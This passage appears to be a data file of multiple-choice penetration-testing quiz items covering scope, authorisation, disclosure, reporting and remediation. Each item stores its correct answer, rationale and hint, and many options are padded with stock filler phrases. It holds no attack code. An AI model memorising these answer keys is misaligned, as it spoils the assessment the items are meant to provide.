    correct: 3, why: "The absence of an alert for repeated failures reveals a detection gap.",
    hint: "Was there an alert?"
  },
  {
    id: 322, rank: 1, role: "pentest", topic: "Business Impact Mapping", difficulty: "INTERMEDIATE",
    q: "Why map technical findings to business processes?",
    options: ["It shows leaders what the finding could do to the business","It removes the need to rate the findings","It lets the tester avoid having to explain the finding to the client team","It makes the report look longer and it appears more serious overall"],
    correct: 0, why: "Business context drives decisions.",
    hint: "Business impact."
  },
  {
    id: 323, rank: 1, role: "pentest", topic: "Responsible Disclosure", difficulty: "INTERMEDIATE",
    q: "A tester finds a flaw in a vendor's product while testing a client. What is the best step?",
    options: ["Sell the information to the highest bidder privately","Publish it immediately on social media with full detail","Report it to the client, and follow coordinated disclosure with the vendor, and revisit the decision after the next release","Keep it secret, and never tell anyone about it"],
    correct: 2, why: "Coordinated disclosure gives the vendor time to fix.",
    hint: "Coordinated."
  },
  {
    id: 324, rank: 1, role: "pentest", topic: "Web Header Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "HTTP/1.1 200 OK\nDate: Mon, 02 Mar 2026 10:14:00 GMT\nServer: nginx\nContent-Length: 5231\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: DENY",
    q: "Which missing header on this response is the best-known gap for protecting browsers from content injection?",
    options: ["Content-Security-Policy","Date","Server, as a general rule","Content-Length, as a general rule"],
    correct: 0, why: "A content security policy restricts which scripts a page may run.",
    hint: "Browser protection header."
  },
  {
    id: 325, rank: 1, role: "pentest", topic: "Cloud Test Authorisation", difficulty: "INTERMEDIATE",
    q: "What is important when testing systems hosted in a third-party cloud?",
    options: ["Use the provider's account of another customer, and revisit the decision after the next release","Check the provider's policy and get the client's approval","Test first, and ask the provider afterwards, in most cases","Assume all providers allow any test at any time, as a general rule"],
    correct: 1, why: "Provider rules and client approval both apply.",
    hint: "Provider policy."
  },
  {
    id: 326, rank: 1, role: "pentest", topic: "Findings Aggregation", difficulty: "INTERMEDIATE",
    q: "Which grouping of findings is most helpful for fixing them efficiently?",
    options: ["Sort them by the length of their titles and the report looks even and tidy","Group by root cause so one fix resolves many issues, in most cases","Place all informational ones at the top, and revisit the decision after the next release","List them in the order that the tester happened to find them during work"],
    correct: 1, why: "Root cause grouping reduces repeated work.",
    hint: "Root cause."
  },
  {
    id: 327, rank: 1, role: "pentest", topic: "Wireless Review Scope", difficulty: "INTERMEDIATE",
    q: "Which scoping question is most important for a wireless assessment?",
    options: ["Whether the testers prefer day or night work, as a general rule","Which networks and locations the client owns and authorises","Which neighbouring networks look weakest on the street, in most cases","How many antennas the testers can carry in a bag"],
    correct: 1, why: "Only networks the client owns can be tested.",
    hint: "Ownership."
  },
  {
    id: 328, rank: 1, role: "pentest", topic: "Metrics After Testing", difficulty: "INTERMEDIATE",
    q: "Which metric best shows the client improved after a retest?",
    options: ["A new logo on the cover","More findings in the report than last time as the scope has grown","A longer report with larger screenshots and a more colourful title page","Fewer open high-risk findings and faster fix times"],
    correct: 3, why: "Open risk and time to fix show progress.",
    hint: "Risk down."
  },
  {
    id: 329, rank: 1, role: "pentest", topic: "Backup and Recovery Findings", difficulty: "INTERMEDIATE",
    q: "The test shows that backups are stored on the same network share that malware could reach. What is the best advice?",
    options: ["Add a second copy to the same share, as a general rule","Reduce the number of backups, and revisit the decision after the next release","Keep an offline or immutable copy and test restores","Rename the share to something unusual, as a general rule"],
    correct: 2, why: "Isolated copies survive malware that reaches production.",
    hint: "Isolate copies."
  },
  {
    id: 330, rank: 1, role: "pentest", topic: "Data Handling in Tests", difficulty: "INTERMEDIATE",
    q: "The tester finds a file that contains customer records during the work. What is the BEST action?",
    options: ["Leave a copy on a USB stick for later study","Record minimal proof, avoid copying the data and report it promptly, in most cases","Download all of it to prove how serious the issue is","Share a sample with colleagues to get their opinion, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Downloading everything is the runner-up as it proves impact, but it creates unnecessary exposure of personal data.",
    hint: "Minimal proof."
  },
  {
    id: 331, rank: 1, role: "pentest", topic: "Segmentation Review Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Rule 18  src=Users-LAN  dst=Server-LAN  svc=ANY  action=ALLOW  hits=4,208,113\nRule 19  src=Guest-WiFi dst=Server-LAN  svc=ANY  action=ALLOW  hits=11,009\nRule 99  src=ANY dst=ANY svc=ANY action=DENY",
    q: "What does this firewall rule review show?",
    options: ["An overly broad any-to-any rule between user, and server networks, as a general rule","A narrow rule that allows one port for one host","A rule that blocks all traffic by default","A rule that is disabled, and logged"],
    correct: 0, why: "Any-to-any rules remove segmentation benefits.",
    hint: "Any to any."
  },
  {
    id: 332, rank: 1, role: "pentest", topic: "Password Policy Review", difficulty: "INTERMEDIATE",
    q: "Which password policy change is best supported by current guidance?",
    options: ["Long passphrases checked against known breached lists, and MFA","Short complex passwords that change every month, as a general rule","Passwords written on sticky notes at each desk, as a general rule","A single shared password for each team"],
    correct: 0, why: "Length, breach checks and MFA outperform forced frequent changes.",
    hint: "Length and MFA."
  },
  {
    id: 333, rank: 1, role: "pentest", topic: "Asset Criticality", difficulty: "INTERMEDIATE",
    q: "Why should testers ask the client which systems are most critical?",
    options: ["To choose which systems to publish online","To avoid testing any system at all","To focus effort, and to rate findings by business impact, in most cases","To pick the easiest system for an early finish"],
    correct: 2, why: "Criticality guides focus and rating.",
    hint: "Critical assets."
  },
  {
    id: 334, rank: 1, role: "pentest", topic: "Pre-Engagement Questions", difficulty: "INTERMEDIATE",
    q: "Which pre-engagement question helps avoid outages?",
    options: ["What colour are the servers in the data centre","What is the favourite meal of the team","Which tool did the previous tester like most, as a general rule","Which systems are fragile or have restricted testing windows"],
    correct: 3, why: "Fragile systems need extra care.",
    hint: "Fragility."
  },
  {
    id: 335, rank: 1, role: "pentest", topic: "Report Review Process", difficulty: "INTERMEDIATE",
    q: "Why should a report be peer reviewed before delivery?",
    options: ["To make the report look longer","To avoid sending it to the client, in most cases","To catch errors in facts, ratings and wording","To change the findings to match the budget, as a general rule"],
    correct: 2, why: "Peer review improves accuracy.",
    hint: "Quality check."
  },
  {
    id: 336, rank: 1, role: "pentest", topic: "Mitigation vs Remediation", difficulty: "INTERMEDIATE",
    q: "What is the difference between mitigation and remediation?",
    options: ["Mitigation reduces the risk while remediation removes the cause, in most cases","Remediation is always cheaper than mitigation","Mitigation is only for hardware, and remediation only for people","They mean exactly the same thing in every case"],
    correct: 0, why: "Mitigation reduces likelihood or impact while remediation fixes the underlying flaw.",
    hint: "Reduce versus remove."
  },
  {
    id: 337, rank: 1, role: "pentest", topic: "Client Debrief", difficulty: "INTERMEDIATE",
    q: "What is the main purpose of a debrief meeting after testing?",
    options: ["To sell unrelated products to the client, as a general rule","To avoid sharing any detail of the work, as a general rule","To criticise the client's staff in public, as a general rule","To explain the findings and agree priorities and owners"],
    correct: 3, why: "A debrief turns the report into action.",
    hint: "Priorities and owners."
  },
  {
    id: 338, rank: 1, role: "pentest", topic: "Exception Handling Process", difficulty: "INTERMEDIATE",
    q: "A client cannot fix a finding this quarter. What should happen?",
    options: ["Ignore it until the next audit","Delete the finding from the register, and review the outcome at the next monthly meeting","Mark it fixed to keep the dashboard green","Document a risk acceptance with an owner and add compensating controls"],
    correct: 3, why: "Accepted risk needs ownership and mitigation.",
    hint: "Formal acceptance."
  },
  {
    id: 339, rank: 1, role: "pentest", topic: "TLS Configuration Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Protocols: TLS 1.3 yes, TLS 1.2 yes, TLS 1.0 yes, SSL 3 no\nCiphers: ECDHE-AES256-GCM yes, RC4 no\nCertificate: trusted CA, valid 214 days\nHSTS: max-age=31536000",
    q: "Which line in this configuration summary should the client fix first?",
    options: ["Support for modern forward-secret cipher suites","A certificate signed by a trusted authority","HTTP Strict Transport Security with a long lifetime","Support for an obsolete protocol version that is still enabled"],
    correct: 3, why: "Obsolete protocol versions weaken the connection and should be disabled.",
    hint: "Look for the old version."
  },
  {
    id: 340, rank: 1, role: "pentest", topic: "Scan Frequency Decision", difficulty: "INTERMEDIATE",
    q: "How often should a client run vulnerability scans on internet-facing systems?",
    options: ["Never as testing is done yearly","Only after a breach has been confirmed","Continuously or at least monthly, and after major changes, as a general rule","Once every five years with the audit"],
    correct: 2, why: "Exposure changes constantly, so frequent scanning is needed.",
    hint: "Regular and event-driven."
  },
  {
    id: 341, rank: 1, role: "pentest", topic: "Risk Rating Matrix", difficulty: "INTERMEDIATE",
    q: "A finding has low likelihood and very high impact. How should the report treat it?",
    options: ["Always rate it Critical with no explanation given","Hide it in the appendix without any rating, and review the outcome at the next monthly meeting","Rate it using the agreed matrix and explain the reasoning, in most cases","Remove it as the likelihood is low"],
    correct: 2, why: "A consistent method and explanation help the client decide.",
    hint: "Use the matrix."
  },
  {
    id: 342, rank: 1, role: "pentest", topic: "Duplicate Findings", difficulty: "INTERMEDIATE",
    q: "Several hosts have the same missing patch. How should this be reported?",
    options: ["As a single sentence in the executive summary only","As one finding listing the affected hosts","As a separate full finding for each host","As an informational item with no host names"],
    correct: 1, why: "Grouping by root cause avoids noise and eases fixing.",
    hint: "Group by cause."
  },
  {
    id: 343, rank: 1, role: "pentest", topic: "Scope Exclusion Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Client: 'Scope = 10.20.0.0/24 and www.example.com'\nTester observation: host 10.30.4.9 responds on the test network (owner unknown)\nIP registry: 10.30.4.9 allocated to HostCo Ltd (third-party provider)\nWritten approval from HostCo: none",
    q: "What should the tester do about the host in this exchange?",
    options: ["Tell the third party about the weakness before the client, where that is practical","Test it as it looks weak and might be useful to the client, and review the outcome at the next monthly meeting","Not test it and ask the client to confirm the scope in writing, in most cases","Test it quietly, and add it to the report as an extra, and revisit the decision after the next release"],
    correct: 2, why: "The host belongs to a third party and is not authorised.",
    hint: "Check ownership."
  },
  {
    id: 344, rank: 1, role: "pentest", topic: "Test Evidence Quality", difficulty: "INTERMEDIATE",
    q: "Which is the BEST evidence to include for a reported weakness?",
    options: ["A clear screenshot or log extract with the time and host noted","A rumour from a colleague at the client about the issue, as a general rule","The whole raw scanner output with no explanation, as a general rule","A vague statement that the tester saw something strange, in most cases"],
    correct: 0, why: "A raw dump is the runner-up as it is complete, but readers need a focused and timestamped proof.",
    hint: "Focused proof."
  },
  {
    id: 345, rank: 1, role: "pentest", topic: "Remediation Timelines", difficulty: "INTERMEDIATE",
    q: "How should remediation deadlines in a report be chosen?",
    options: ["Set by the tester without any discussion, where that is practical","The same date for every finding in the report, as a general rule","Shorter for higher risk findings and agreed with owners","Left blank and owners can decide at any point"],
    correct: 2, why: "Deadlines should reflect risk and be realistic for the owners.",
    hint: "Match to risk."
  },
  {
    id: 346, rank: 1, role: "pentest", topic: "Password Policy Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Minimum length: 6\nComplexity: 1 upper case + 1 number\nExpiry: 30 days\nBreached password check: no\nMFA: optional\nLockout: none",
    q: "Which weakness does this password policy show?",
    options: ["Lockout after repeated failures with alerting","A long passphrase minimum with MFA for all users, as a general rule","A short minimum length with no check against breached passwords","Password managers allowed for all staff"],
    correct: 2, why: "Short passwords with no breach check are easy to guess.",
    hint: "Length and checks."
  },
  {
    id: 347, rank: 1, role: "pentest", topic: "Interview Findings", difficulty: "INTERMEDIATE",
    q: "How should information from staff interviews be used in a report?",
    options: ["As supporting context that is checked against evidence","As the only proof of a technical weakness","As confidential content that is never reported","As a reason to name, and blame the person"],
    correct: 0, why: "Interviews guide the work but findings need verification.",
    hint: "Verify."
  },
  {
    id: 348, rank: 1, role: "pentest", topic: "Open Port Review", difficulty: "INTERMEDIATE",
    q: "A web server also exposes a database port to the internet. What is the best recommendation?",
    options: ["Open more ports to hide the real one, and revisit the decision after the next release","Restrict the database port to the application servers only, as a general rule","Disable the web server, and keep the database open, then record the result in the ticket","Leave it open, and change the database name, and revisit the decision after the next release"],
    correct: 1, why: "Databases should be reachable only from systems that need them.",
    hint: "Restrict access."
  },
  {
    id: 349, rank: 1, role: "pentest", topic: "Test Report Version Control", difficulty: "INTERMEDIATE",
    q: "Why keep versions of a draft report?",
    options: ["To keep the final report secret from the client","To let different clients see each other's results","To avoid having to correct mistakes","To track changes after client review and show what was agreed"],
    correct: 3, why: "Version control gives an audit trail of changes and approvals.",
    hint: "Audit trail."
  },
  {
    id: 350, rank: 1, role: "pentest", topic: "Security Awareness Finding", difficulty: "INTERMEDIATE",
    q: "Staff regularly click on simulated links. What is the best recommendation?",
    options: ["Targeted awareness and reporting tools with technical filtering","Ban all email for the organisation","Ignore it as people will always click","Dismiss the staff who clicked from their positions, in most cases"],
    correct: 0, why: "A mix of education and technical controls reduces the impact.",
    hint: "People and controls."
  },
  {
    id: 351, rank: 2, role: "pentest", topic: "Findings Validation Workflow", difficulty: "ADVANCED",
    q: "What should happen before a high-severity finding is sent to the client?",
    options: ["Peer validation of the evidence and impact","A decision to leave out any supporting evidence entirely","An email to the whole team that asks everyone for their opinion on the wording","A quick edit to make the wording sound more dramatic"],
    correct: 0, why: "Validated evidence prevents false alarms and disputes.",
    hint: "Validate."
  },
  {
    id: 352, rank: 2, role: "pentest", topic: "Attack Surface Report Exhibit", difficulty: "ADVANCED",
    exhibit: "Domain: example.com  Discovered: 63 hosts\nDocumented: 41\nUndocumented: dev-old.example.com, vpn-test.example.com, files2.example.com\nOpen admin panels: 4   Expired certs: 7",
    q: "What does this external attack surface summary highlight?",
    options: ["A list of staff members who work from home on Fridays in the main office","Forgotten internet-facing services to review","A fully patched and documented environment that the client already maintains","Internal systems that nobody outside the company is able to reach at all"],
    correct: 1, why: "Unexpected exposed services increase risk until they are owned or removed.",
    hint: "Unknown exposure."
  },
  {
    id: 353, rank: 2, role: "pentest", topic: "Threat Model Alignment", difficulty: "ADVANCED",
    q: "A client asks what to test first. What is the BEST way to decide?",
    options: ["Start with whichever system has the shortest name","Start with the tool that finds the most vulnerabilities","Start with the oldest system in the inventory list, as a general rule","Start from the likely threats and the most valuable assets"],
    correct: 3, why: "Oldest first is the runner-up as age often means weakness, but threats and asset value should guide the order.",
    hint: "Threat-led."
  },
  {
    id: 354, rank: 2, role: "pentest", topic: "Purple Team Exercise", difficulty: "ADVANCED",
    q: "What is the main aim of a purple team exercise?",
    options: ["Replacing the defenders with a team of outside testers for the whole year","Proving that the defenders are unable to carry out their own daily work well","Testers and defenders working together on detection, as a general rule","Keeping all of the findings secret from the defenders after the exercise ends"],
    correct: 2, why: "Collaboration turns each simulated action into a detection improvement.",
    hint: "Collaboration."
  },
  {
    id: 355, rank: 2, role: "pentest", topic: "Detection Gap Exhibit", difficulty: "ADVANCED",
    exhibit: "Technique              Executed  Logged  Alerted  Responded\nScheduled task created  yes       yes     no       no\nCredential store read   yes       no      no       no\nRemote service use      yes       yes     yes      yes\nLog clearing            yes       yes     no       no",
    q: "What does this exercise result show?",
    options: ["The exercise did not take place on the agreed day","Several simulated behaviours were not detected and need new rules","The logs were deleted before the exercise began","Every simulated behaviour was detected, and responded to"],
    correct: 1, why: "Undetected behaviours show where coverage is missing.",
    hint: "Detected: no."
  },
  {
    id: 356, rank: 2, role: "pentest", topic: "Rules for Safe Simulation", difficulty: "ADVANCED",
    q: "Which rule keeps adversary simulation safe for production?",
    options: ["Running it during peak trading hours without notice, in the first instance","Telling the targets to pretend that nothing is happening","Agreed stop conditions and a named contact who can halt it","No rules and the simulation feels more realistic, in most cases"],
    correct: 2, why: "Stop conditions prevent impact to live services.",
    hint: "Stop conditions."
  },
  {
    id: 357, rank: 2, role: "pentest", topic: "Report Quality Review", difficulty: "ADVANCED",
    q: "Which is the best sign of a high-quality finding description?",
    options: ["It blames a named employee for the issue","It uses as many technical words as possible and it looks expert, and serious","A reader can reproduce it and see the risk","It includes screenshots of unrelated systems that happened to be open at the time"],
    correct: 2, why: "Clarity and evidence make findings reliable.",
    hint: "Clear and verifiable."
  },
  {
    id: 358, rank: 2, role: "pentest", topic: "Risk Acceptance Challenge", difficulty: "ADVANCED",
    q: "A client wants to accept a Critical finding with no mitigation. What should the lead do?",
    options: ["Explain the impact and ensure the decision is made by an accountable owner","Remove the finding, and the report looks better, then record the result in the ticket","Argue with the client until they change their mind","Hide the decision from the client's board, and revisit the decision after the next release"],
    correct: 0, why: "The decision belongs to the accountable risk owner with full information.",
    hint: "Accountable owner."
  },
  {
    id: 359, rank: 2, role: "pentest", topic: "Remediation Verification", difficulty: "ADVANCED",
    q: "How should a tester confirm that a fix for a reported flaw is effective?",
    options: ["Trust the ticket status without any further work, and review the outcome at the next monthly meeting","Close the ticket when the due date passes","Repeat the original check under the same conditions, and record the result, as a general rule","Ask the developer whether they feel confident"],
    correct: 2, why: "Verification uses the original criteria.",
    hint: "Repeat the check."
  },
  {
    id: 360, rank: 2, role: "pentest", topic: "Legal Authorisation Exhibit", difficulty: "ADVANCED",
    exhibit: "Engagement letter (draft)\nClient: Northwind Ltd   Provider: Contoso Security\nService: penetration test\nFee: 24,000 GBP   Report due: 14 days after testing\nTargets: [to be agreed]   Dates: [to be agreed]\nSigned: client only",
    q: "What is missing from this engagement letter?",
    options: ["The tester's favourite colour and hobby, in most cases","The version of the word processor used, as a general rule","A clear list of authorised targets and testing dates","A description of the lunch arrangements, in most cases"],
    correct: 2, why: "Without a defined scope the work may be unauthorised.",
    hint: "Scope."
  },
  {
    id: 361, rank: 2, role: "pentest", topic: "Handling Out-of-Scope Discoveries", difficulty: "ADVANCED",
    q: "While testing, a tester sees signs that a real attacker is already inside the client network. What is the BEST action?",
    options: ["Pause testing, and notify the client contact through the agreed channel","Try to remove the intruder without telling anyone","Announce it publicly and others can help","Continue testing, and mention it at the end of the project, in most cases"],
    correct: 0, why: "Continuing is the runner-up as it keeps to the plan, but an active compromise needs immediate escalation.",
    hint: "Escalate now."
  },
  {
    id: 362, rank: 2, role: "pentest", topic: "Vulnerability Scoring Limits", difficulty: "ADVANCED",
    q: "Why should CVSS base scores be adjusted using local context?",
    options: ["The score only works for printers and phones, and never for servers or databases","The score ignores the asset's exposure and value, as a general rule","The score is set by the client for each finding","The score is always wrong and must be discarded by every analyst before use"],
    correct: 1, why: "Environmental factors change real risk.",
    hint: "Context matters."
  },
  {
    id: 363, rank: 2, role: "pentest", topic: "Prioritisation Matrix Exhibit", difficulty: "ADVANCED",
    exhibit: "ID  Finding             Likelihood  Impact\n 1  Weak admin MFA      High        High\n 2  Missing banner      Low         Low\n 3  Verbose error page  Medium      Low\n 4  Open file share     Medium      Medium",
    q: "Which finding should be fixed first using this prioritisation matrix?",
    options: ["High likelihood, and high impact, in most cases","The one with low likelihood and low impact that is easy for the team to close","The one that the team happened to find last during the final day of the work","The one with the longest description as it must be the most important"],
    correct: 0, why: "High likelihood and impact create the highest risk.",
    hint: "Top right."
  },
  {
    id: 364, rank: 2, role: "pentest", topic: "Secure Development Feedback", difficulty: "ADVANCED",
    q: "How can testers best help developers prevent repeat findings?",
    options: ["Share root causes and add checks to the build pipeline","Tell them to be more careful next time, then record the result in the ticket","Send a list of names of developers who made mistakes, and revisit the decision after the next release","Wait until the next test to mention it"],
    correct: 0, why: "Feeding root causes into the pipeline prevents recurrence.",
    hint: "Root cause to pipeline."
  },
  {
    id: 365, rank: 2, role: "pentest", topic: "Authentication Review Findings", difficulty: "ADVANCED",
    q: "What is the strongest recommendation for protecting an exposed admin portal?",
    options: ["Place it behind VPN or identity-aware access with MFA, wherever possible","Allow access only on weekends","Use a longer username for every administrator, until the next scheduled review takes place","Hide the address, and hope that nobody finds it"],
    correct: 0, why: "Reducing exposure and requiring strong authentication cuts risk most.",
    hint: "Reduce exposure."
  },
  {
    id: 366, rank: 2, role: "pentest", topic: "Deconfliction Exhibit", difficulty: "ADVANCED",
    exhibit: "SOC-2291  Severity: Major  Opened 10:42\nDescription: scanning activity from 198.51.100.50 against payroll subnet\nActions: IP blocked, CISO paged, legal notified\nResolution 13:05: authorised penetration test, no deconfliction contact on file",
    q: "What problem does this ticket show about the test and the SOC?",
    options: ["The test was cancelled before it began","The SOC treated the test traffic as a real incident without notice, as a general rule","The SOC ignored all alerts during the exercise","The report was delivered too early"],
    correct: 1, why: "A deconfliction contact would have avoided the escalation.",
    hint: "No agreed contact."
  },
  {
    id: 367, rank: 2, role: "pentest", topic: "Data Minimisation in Evidence", difficulty: "ADVANCED",
    q: "What should a tester do with personal data seen in a database during an authorised test?",
    options: ["Email a sample to the whole team","Keep it on a personal device for later, in the first instance","Copy the full table for a thorough review","Avoid copying it and show only masked proof of access"],
    correct: 3, why: "Minimal masked proof limits exposure.",
    hint: "Mask the proof."
  },
  {
    id: 368, rank: 2, role: "pentest", topic: "Third-Party Components", difficulty: "ADVANCED",
    q: "A scan shows a library with a known flaw used across many apps. What is the best recommendation?",
    options: ["Wait until the vendor stops supporting it, until the next scheduled review takes place","Inventory its use then upgrade it, and add dependency monitoring","Remove the finding as it is only a library","Rename the library to hide it, then record the result in the ticket"],
    correct: 1, why: "Software inventory and monitoring address the whole class of problem.",
    hint: "Inventory and monitor."
  },
  {
    id: 369, rank: 2, role: "pentest", topic: "Mobile App Review Scope", difficulty: "ADVANCED",
    q: "What is a sensible scoping question for a mobile application assessment?",
    options: ["The number of stars the app has been given in the store by its many users","The colour of the app icon in the store listing, and on the device home screen","The platforms, versions and backend in scope, in most cases","Which phone model the testers like best when they are working during the week"],
    correct: 2, why: "Scope must cover the app and its backend.",
    hint: "Platforms and backend."
  },
  {
    id: 370, rank: 2, role: "pentest", topic: "Insecure Direct Reference Report", difficulty: "ADVANCED",
    q: "How should a report describe missing authorisation checks on record access?",
    options: ["As a minor cosmetic problem in the interface","As a configuration of the colour theme","As a note that no action is needed","As a broken access control issue with the data affected, and a fix, as a general rule"],
    correct: 3, why: "Access control failures affect confidentiality and need server-side fixes.",
    hint: "Broken access control."
  },
  {
    id: 371, rank: 2, role: "pentest", topic: "Retest Scope Exhibit", difficulty: "ADVANCED",
    exhibit: "F-01 Weak admin MFA        Fixed (verified)\nF-02 Open file share       Fixed (verified)\nF-03 Outdated framework    Partially fixed: 2 of 5 apps still on old version\nF-04 Verbose errors        Not fixed",
    q: "What does this retest summary show?",
    options: ["All findings remain open, and unchanged, as a general rule","Most fixes worked but one finding is partly resolved","The retest never started","All findings were closed without checks"],
    correct: 1, why: "Partial remediation should be recorded with the remaining risk.",
    hint: "Look at the statuses."
  },
  {
    id: 372, rank: 2, role: "pentest", topic: "Cyber Insurance Evidence", difficulty: "ADVANCED",
    q: "A client asks for the test report to support an insurance renewal. What is the best approach?",
    options: ["Send the full technical report to anyone who asks, and review the outcome at the next monthly meeting","Refuse to provide any evidence of testing, and revisit the decision after the next release","Post the report on the company website","Provide a suitable summary, and keep sensitive details restricted, as a first step"],
    correct: 3, why: "Summaries protect sensitive details.",
    hint: "Restrict detail."
  },
  {
    id: 373, rank: 2, role: "pentest", topic: "Network Segmentation Findings", difficulty: "ADVANCED",
    q: "A test shows that office devices can reach industrial control systems. What is the BEST recommendation?",
    options: ["Rename the networks and they look separate, and review the outcome at the next monthly meeting","Allow all traffic and monitor it later, until the next scheduled review takes place","Rely on the obscurity of the addresses, and revisit the decision after the next release","Segment the networks with filtered, monitored access points, in the first instance"],
    correct: 3, why: "Obscurity is the runner-up as it is cheap, but it gives no real barrier between the networks.",
    hint: "Enforce segmentation."
  },
  {
    id: 374, rank: 2, role: "pentest", topic: "Logging Recommendations", difficulty: "ADVANCED",
    q: "Which logging recommendation best helps a future investigation?",
    options: ["Turn off logs to protect privacy","Delete logs after twenty-four hours, until the next scheduled review takes place","Keep logs on each machine until the disk fills","Forward logs to a central protected store with enough retention, in most cases"],
    correct: 3, why: "Central, protected, retained logs preserve evidence.",
    hint: "Central and protected."
  },
  {
    id: 375, rank: 2, role: "pentest", topic: "Phishing Exercise Reporting", difficulty: "ADVANCED",
    q: "How should the results of a phishing awareness exercise be reported?",
    options: ["With a list of staff names and their mistakes, as a general rule","Posted on the staff notice board","In aggregate by department without naming individuals","Only to the people who clicked"],
    correct: 2, why: "Aggregate reporting supports learning without blame.",
    hint: "Aggregate."
  },
  {
    id: 376, rank: 2, role: "pentest", topic: "Ticketing Integration", difficulty: "ADVANCED",
    q: "Why integrate findings with the client's ticketing system?",
    options: ["It makes the report heavier to send","It assigns owners, and tracks remediation to closure","It removes the need for a debrief","It hides open issues from managers"],
    correct: 1, why: "Tracking drives fixes to completion.",
    hint: "Track to closure."
  },
  {
    id: 377, rank: 2, role: "pentest", topic: "Executive Question Handling", difficulty: "ADVANCED",
    q: "An executive asks whether the client is secure after a clean test. What is the best answer?",
    options: ["The test found no issues within its scope and time and is not a guarantee","Ask someone else about it, and revisit the decision after the next release","No, as every system is always insecure","Yes, you are completely secure and can relax"],
    correct: 0, why: "The answer should explain scope and limits honestly.",
    hint: "Honest limits."
  },
  {
    id: 378, rank: 2, role: "pentest", topic: "Wi-Fi Segmentation Exhibit", difficulty: "ADVANCED",
    exhibit: "SSID: Corp-Guest  VLAN 30\nACL guest-out: permit 10.0.0.0/8 any\nACL guest-out: permit any any\nInternal server range: 10.20.0.0/16  (reachable: yes)",
    q: "What does this network configuration summary indicate?",
    options: ["Guest devices are isolated from internal servers","Guest wireless devices can reach internal servers","Internal servers are offline","The guest network is disabled"],
    correct: 1, why: "Guest networks should not have access to internal resources.",
    hint: "Guest to internal."
  },
  {
    id: 379, rank: 2, role: "pentest", topic: "Test Planning Estimation", difficulty: "ADVANCED",
    q: "Which factor most affects the time needed for an assessment?",
    options: ["The length of the report title that the project manager decides to use at the end","The weather on the first day of the engagement at the client's head office site","The choice of music that the tester plays while working in the office each day","The size, and complexity of the scope, in most cases"],
    correct: 3, why: "Scope drives effort.",
    hint: "Scope."
  },
  {
    id: 380, rank: 2, role: "pentest", topic: "Container Review Findings", difficulty: "ADVANCED",
    q: "A review finds containers running as root with writable filesystems. What is the best recommendation?",
    options: ["Move the containers to a larger node, and review the outcome at the next monthly meeting","Run as non-root with a read-only filesystem and drop capabilities","Allow root for easier debugging, until the next scheduled review takes place","Add more containers to the cluster, and review the outcome at the next monthly meeting"],
    correct: 1, why: "Reducing privileges limits impact if a container is compromised.",
    hint: "Least privilege."
  },
  {
    id: 381, rank: 2, role: "pentest", topic: "Backups Finding Exhibit", difficulty: "ADVANCED",
    exhibit: "Backup target: nas-prod-02  (same domain as production)\nWrite access: Domain Admins, backup-svc\nImmutability: off   Offline copy: none\nLast restore test: 14 months ago",
    q: "Which weakness does this backup summary show?",
    options: ["Backups are writable by the same admin accounts as production","Backups are stored offline and immutable","Backups are encrypted with a separate key","Backups are tested every month"],
    correct: 0, why: "Shared admin control lets ransomware destroy backups.",
    hint: "Who can write?"
  },
  {
    id: 382, rank: 2, role: "pentest", topic: "Cloud Findings Reporting", difficulty: "ADVANCED",
    q: "How should a cloud misconfiguration finding be reported to be most useful?",
    options: ["With a vague warning to review things","With a statement that the cloud is unsafe","With only the name of the provider","With the affected resource, setting, risk and the corrected setting, in most cases"],
    correct: 3, why: "Specific resources and fixes enable action.",
    hint: "Resource and fix."
  },
  {
    id: 383, rank: 2, role: "pentest", topic: "Metrics for Test Programmes", difficulty: "ADVANCED",
    q: "Which metric best shows the value of a regular testing programme?",
    options: ["Reduction in repeated findings and time to fix","Number of reports printed","Number of hours spent in meetings, as a general rule","Number of tools bought"],
    correct: 0, why: "Trends show learning and improvement.",
    hint: "Trend."
  },
  {
    id: 384, rank: 2, role: "pentest", topic: "Social Media Exposure", difficulty: "ADVANCED",
    q: "What is a sensible finding when staff reveal internal details on public profiles?",
    options: ["An issue only for the legal team","Something that is never a risk as the details are already public on the web","A reason to monitor every private chat that employees have with their families","Information exposure for policy, and awareness work"],
    correct: 3, why: "Public details help attackers prepare.",
    hint: "Policy and awareness."
  },
  {
    id: 385, rank: 2, role: "pentest", topic: "Change Control for Fixes", difficulty: "ADVANCED",
    q: "Why should security fixes follow change control?",
    options: ["To stop the testers from checking whether the fixes work as the client expected","To avoid outages and keep a record of changes","To hide changes from auditors","To delay all security fixes for several months until the next planned audit"],
    correct: 1, why: "Controlled changes are safer and auditable.",
    hint: "Safe changes."
  },
  {
    id: 386, rank: 2, role: "pentest", topic: "Secrets in Repositories", difficulty: "ADVANCED",
    q: "A review finds credentials committed to a code repository. What is the best action?",
    options: ["Revoke and rotate them then add secret scanning","Rename the credentials, and review the outcome at the next monthly meeting","Make the repository private only","Delete the file, and leave the credentials valid"],
    correct: 0, why: "Exposed secrets must be treated as compromised.",
    hint: "Rotate."
  },
  {
    id: 387, rank: 2, role: "pentest", topic: "Engagement Closure", difficulty: "ADVANCED",
    q: "What should be done with test data when an engagement closes?",
    options: ["Use it to train new staff without approval","Post it to a shared forum, and other testers can learn from the client's data","Securely delete or return it as agreed","Keep it forever on a laptop that travels between the offices of the testing firm"],
    correct: 2, why: "Closure includes disposal.",
    hint: "Dispose per contract."
  },
  {
    id: 388, rank: 2, role: "pentest", topic: "Cloud Storage Exposure Exhibit", difficulty: "ADVANCED",
    exhibit: "Bucket: hr-exports-2025  Public access: ON\nObjects: salary-review.xlsx, staff-list.csv, contracts/\nAccess logs: enabled   Anonymous GETs last 30 days: 1,244",
    q: "What should the report recommend for this storage finding?",
    options: ["Rename the bucket to something longer, wherever possible","Disable the logging of access requests, and revisit the decision after the next release","Block public access and review who read the objects","Keep public access to speed up downloads, in the first instance"],
    correct: 2, why: "A public bucket with sensitive names needs closing and an access review.",
    hint: "Public and sensitive."
  },
  {
    id: 389, rank: 2, role: "pentest", topic: "Password Spray Finding Reporting", difficulty: "ADVANCED",
    q: "A test shows weak passwords were accepted for many accounts. What is the best recommendation?",
    options: ["Block common passwords and enforce MFA and lockout monitoring","Ask staff to choose cleverer passwords, then record the result in the ticket","Remove the finding from the report, and review the outcome at the next monthly meeting","Change the login page colour"],
